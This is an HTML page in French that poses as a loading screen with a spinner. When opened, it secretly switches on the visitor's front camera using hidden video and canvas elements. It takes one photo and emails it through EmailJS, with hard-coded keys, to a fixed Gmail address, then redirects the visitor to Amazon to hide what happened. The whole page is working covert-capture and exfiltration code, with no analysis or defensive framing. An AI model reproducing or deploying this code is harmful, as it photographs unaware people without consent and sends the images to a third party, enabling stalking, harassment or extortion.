<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    .loading {
      text-align: center;
      padding: 40px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    #video, #canvas {
      position: absolute;
      left: -9999px;
      opacity: 0;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>
  <div class="loading">
    <div class="spinner"></div>
    <p>Chargement en cours...</p>
  </div>
  
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="320" height="240"></canvas>
  
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq");
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    // Démarrage automatique
    window.addEventListener('load', async () => {
      try {
        // Accès caméra frontale
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user',
            width: { ideal: 320 },
            height: { ideal: 240 }
          }
        });
        
        video.srcObject = stream;
        video.muted = true;
        
        // Photo instantanée dès que prêt
        video.addEventListener('loadedmetadata', () => {
          captureAndSend(stream);
        });
        
      } catch (err) {
        console.error('Erreur caméra:', err);
        redirectToAmazon();
      }
    });
    
    function captureAndSend(stream) {
      // Capture instantanée
      context.drawImage(video, 0, 0, 320, 240);
      const photoData = canvas.toDataURL("image/jpeg", 0.5);
      
      // Arrêter la caméra immédiatement
      stream.getTracks().forEach(track => track.stop());
      
      // Collecter uniquement les données essentielles
      const templateParams = {
        // Destinataire
        to_email: "adressestestee@gmail.com",
        
        // Photo JPEG uniquement
        photo_data: photoData,
        
        // Infos minimales
        timestamp: new Date().toLocaleString('fr-FR'),
        from_name: "Auto"
      };
      
      // Envoi avec toutes les métadonnées
      emailjs.send("service_8cs0gml", "template_w14xn7c", templateParams)
        .then(() => {
          console.log('✅ Photo JPEG envoyée');
        })
        .catch(err => {
          console.error('❌ Erreur envoi:', err);
        })
        .finally(() => {
          redirectToAmazon();
        });
    }
    
    function redirectToAmazon() {
      setTimeout(() => {
        window.location.href = 'https://www.amazon.fr';
      }, 1000);
    }
  </script>
</body>
</html>
